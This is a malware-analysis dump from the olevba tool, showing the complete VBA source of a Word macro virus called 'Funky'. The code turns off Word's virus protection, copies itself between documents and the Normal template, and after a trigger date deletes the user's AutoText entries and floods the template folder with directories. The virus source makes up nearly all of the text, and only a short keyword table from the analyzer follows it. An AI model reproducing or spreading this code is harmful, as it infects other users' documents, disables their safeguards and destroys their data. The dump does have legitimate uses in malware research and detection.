olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Funky-3a58e354113595a3ad17f19fa2908bc15347deb2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Funky-3a58e354113595a3ad17f19fa2908bc15347deb2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()
On Error GoTo dnew
 Call copyfromtempl
dnew:
Exit Sub
End Sub

Private Sub Document_Open()
On Error GoTo Dopen
  With Options
    .VirusProtection = False
  End With
 Call copyfromtempl
 Call copytotempl
Dopen:
Exit Sub
End Sub
-------------------------------------------------------------------------------
VBA MACRO Funky.bas 
in file: Virus.MSWord.Funky-3a58e354113595a3ad17f19fa2908bc15347deb2 - OLE stream: 'Macros/VBA/Funky'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Public templpath, docouname, docname As String
Public autentriesn
Public autentriest
Public uname
Public newdirc, lengthdirc, NPath
Public w, x, z, y, doccount, projcount As Integer
Public mytemplate As Template
Const Funkydate = "13/ 08 / 99"
Public lengthn
Public fnamet, fnamet2, fnamed, fnamed2 As String

Sub Autoexec()
On Error GoTo exitsub
   
   Application.Documents.Add

   doccount = Application.Documents.Count
   
   If doccount = 1 Then
        GoTo copyto
   ElseIf doccount > 1 Then
           Normal.ThisDocument.ActiveWindow.Activate
   End If
  
copyto:
    
    
        Call copytotempl
        Call copyfromtempl

Funkyday:

If Now() = Funkydate Or Now() > Funkydate Then
    GoTo Funkystart
Else
    GoTo exitsub
End If

Funkystart:
   Call pagelay
   
   Set mytemplate = ActiveDocument.AttachedTemplate
  
   If mytemplate.AutoTextEntries.Count = 0 Then
        For z = 1000 To 1 Step -1
            Call newdir
        Next z
        Exit Sub
   Else
        
        For x = mytemplate.AutoTextEntries.Count To 1 Step -1
          
          autentriesn = mytemplate.AutoTextEntries(x).Name
          autentriest = mytemplate.AutoTextEntries(x).Value
              Call Templatepath
              Call dircreate
          mytemplate.AutoTextEntries(x).Delete
                
                If mytemplate.AutoTextEntries.Count = 0 Then
                    GoTo Message
                End If
        Next x
   End If
 Exit Sub
exitsub:
  
Exit Sub
Message:
   Call sname
   
   MsgBox "Hi, " & "< " & uname & " >" & Chr(13) & Chr(10) & Chr(13) & Chr(10) & "Sorry, did you say there are no more Autotext Entries? " & Chr(13) & Chr(10) & "Never mind, you should have enough information to replace it." & Chr(13) & Chr(10) & "Take a look at your Templates directory !!!", vbCritical, "Wipe-out !!!"
    GoTo exitsub
   
End Sub

Sub Templatepath()
On Error GoTo exitsub
    templpath = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
    
    If templpath = "" Then
        templpath = "c:\office97\templates"
        MkDir templpath
 
    Else
        templpath = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
  
    End If
   
    Open templpath & "\Tpath.txt" For Output As 1#
        Write #1, templpath
    Close #1
exitsub:

End Sub

Sub dircreate()

On Error GoTo ending
   
    lengthn = Len(autentriesn)
    autentriesn = Trim(Mid(autentriesn, 1, lengthn - 1))
    MkDir templpath & "\" & autentriesn
    Open templpath & "\" & autentriesn & "\" & autentriesn & ".txt" For Output As 1#
        Write #1, autentriest
    Close #1
   
ending:
End Sub

Sub sname()
On Error GoTo exitsub
    uname = Application.UserName
exitsub:
End Sub

Sub pagelay()
On Error GoTo exitsub
    If ActiveWindow.View.SplitSpecial = wdPaneNone Then
        ActiveWindow.ActivePane.View.Type = wdPageView
    Else
        ActiveWindow.View.Type = wdPageView
    End If
exitsub:
End Sub

Sub newdir()
On Error GoTo wrfile
    Call Templatepath
    Open templpath & "\Tpath.txt" For Input As #1
        Do While Not EOF(1)
            Input #1, newdirc
        Loop
    Close #1
    lengthdirc = Len(newdirc)
    newdirc = Trim(Mid(newdirc, 1, lengthdirc))
    NPath = Trim(Mid(newdirc, 4, lengthdirc))
    MkDir newdirc & (z)
exitsub:
Exit Sub
wrfile:
    Call errdircreate
    GoTo exitsub
End Sub

Sub errdircreate()
On Error GoTo endnow
    Open newdirc & (z) & "\" & "\" & NPath & (z) & ".txt" For Output As 1#
        Write #1, newdirc & (z)
    Close #1
exitsub:
    Exit Sub
endnow:
    Call Pathchange
GoTo exitsub
End Sub

Sub Pathchange()
On Error GoTo npathchange
    Options.DefaultFilePath(Path:=wdUserTemplatesPath) = "C:\temp"
exitsub:
    Exit Sub
npathchange:
    Call Nextpathchange
GoTo exitsub
End Sub

Sub Nextpathchange()
On Error GoTo lpathchange
    Options.DefaultFilePath(Path:=wdUserTemplatesPath) = "C:\Windows\temp"
    
exitsub:
   Exit Sub
lpathchange:
    Call Lastpathchange
    GoTo exitsub
   
End Sub

Sub Lastpathchange()
On Error GoTo finish
    MkDir ("c:\windows\temp")
    Options.DefaultFilePath(Path:=wdUserTemplatesPath) = "C:\Windows\temp"
finish:
    
End Sub

Sub copyfromtempl()

On Error GoTo exitsub
    docname = ActiveDocument.Name
  Call Fnames
  
  If (fnamed <> "" And fnamed2 = "Funky") Or (fnamed = False And fnamed2 = "Funky") Then
        GoTo exitsub
  Else
    With ActiveDocument
      .UpdateStylesOnOpen = False
      .AttachedTemplate = "Normal.dot"
   
    End With
   Call Templatepath
   doccount = Application.Documents.Count
     
          NormalTemplate.VBProject.VBComponents.Item(2).Export (templpath & "\funky2.bas")
          
          Call filecreate
  
         Application.ActiveDocument.VBProject.VBComponents.Import (templpath & "\funky2.bas")
         Application.ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromFile (templpath & "\funky1.bas")
            
   Kill templpath & "\funky1.bas"
   Kill templpath & "\funky2.bas"
   End If
   
Exit Sub
exitsub:
 Exit Sub
End Sub

Sub copytotempl()
On Error GoTo exitsub
  Call Fnames
  If fnamet = False And fnamet2 = "Funky" Or fnamet <> "" And fnamet2 = "Funky" Then
        GoTo exitsub
  Else
       
    Call Templatepath
    Call filecreate
    doccount = Application.Documents.Count

    Application.Documents(doccount).VBProject.VBComponents(2).Export (templpath & "\funky2.bas")
  
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (templpath & "\funky1.bas")
    NormalTemplate.VBProject.VBComponents.Import (templpath & "\funky2.bas")
   
    Kill templpath & "\funky1.bas"
    Kill templpath & "\funky2.bas"
   End If
 Exit Sub
exitsub:
Exit Sub
End Sub


Sub filecreate()
Dim info1, info2, info3, info4, info5, info6, info7, info8, info9, info10, info11, info12, info13, info14, info15, info16 As String
On Error GoTo errcreate


Open templpath & "\funky1.bas" For Append As #1
        
            info1 = "Private Sub Document_New()"
            info2 = " Call copyfromtempl"
            info3 = "end sub"
            info4 = ""
            info5 = "Private Sub Document_Open()"
            info6 = " Call copyfromtempl"
            info7 = " Call copytotempl"
            info8 = "End Sub"
            info9 = "On error goto dnew"
            info10 = "dnew:"
            info11 = "exit sub"
            info12 = "On error goto dopen"
            info13 = "Dopen:"
            info14 = "  With Options"
            info15 = "    .VirusProtection = False"
            info16 = "  End With"
            
           
           Print #1, info1
           Print #1, info9
           Print #1, info2
           Print #1, info10
           Print #1, info11
           Print #1, info3
           Print #1, info4
           Print #1, info5
           Print #1, info12
           Print #1, info14
           Print #1, info15
           Print #1, info16
           Print #1, info6
           Print #1, info7
           Print #1, info13
           Print #1, info11
           Print #1, info8
          
          
    Close #1

errcreate:

End Sub

Sub Fnames()
On Error GoTo fname_end
    
        fnamet = IsEmpty(NormalTemplate.VBProject.VBComponents.Item(2))
        fnamet2 = NormalTemplate.VBProject.VBComponents.Item(2).Name
    For y = Application.Documents.Count To 1 Step -1
    fnamed = Empty
    fnamed2 = Empty
    projcount = Empty
            projcount = Application.Documents(y).VBProject.Collection(2).VBComponents.Count
        For w = 1 To (projcount) Step 1
            fnamed = IsEmpty(Application.Documents(y).VBProject.VBComponents.Item(2))
            fnamed2 = Application.Documents(y).VBProject.VBComponents(w).Name
        Next w
    Next y
    
fname_end:
Exit Sub

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

